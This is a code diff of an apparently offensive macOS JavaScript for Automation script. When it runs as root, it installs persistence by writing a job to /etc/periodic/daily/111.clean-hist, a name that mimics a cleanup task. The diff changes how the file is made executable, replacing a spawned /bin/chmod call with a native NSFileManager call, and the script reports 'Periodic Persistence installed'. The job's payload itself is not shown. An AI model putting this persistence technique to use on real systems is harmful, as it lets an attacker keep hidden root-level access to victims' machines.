@@ -15,22 +15,14 @@ if (userName != 'root')
 } else
 {
 
-function executeBackground(binPath,arg1,arg2,arg3){
-	var path = binPath 
-	var args = [arg1,arg2,arg3]
-	var pipe = $.NSPipe.pipe;
-	var file = pipe.fileHandleForReading;
-	var task = $.NSTask.alloc.init;
-	task.launchPath = path;
-	task.arguments = args;
-	task.standardOutput = pipe; 
-	task.standardError = pipe;
-	task.launch; 
-	let data = file.readDataToEndOfFile; 
-    file.closeFile;
-    response = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
-	return response
-	}
+	function chmod(value, path) {
+        let a = $({NSFilePosixPermissions:value})
+        let p = $(path).stringByStandardizingPath
+        let e = $()
+        let r = $.NSFileManager.defaultManager
+                .setAttributesOfItemAtPathError(a, p, e)
+        return r
+    }
 
 var periodicFilepath = "/etc/periodic/daily/111.clean-hist"
 function writeTextToFile(text, file, overwriteExistingContent) {
@@ -44,7 +36,7 @@ function writeTextToFile(text, file, overwriteExistingContent) {
 }
 writeTextToFile(periodicJobaction, periodicFilepath, true)
 
-executeBackground("/bin/chmod","+x",periodicFilepath,"&")
+chmod(0o755,periodicFilepath)
 output += "Periodic Persistence installed at etc/periodic/daily/111.clean-hist"
 }
 }catch(error){
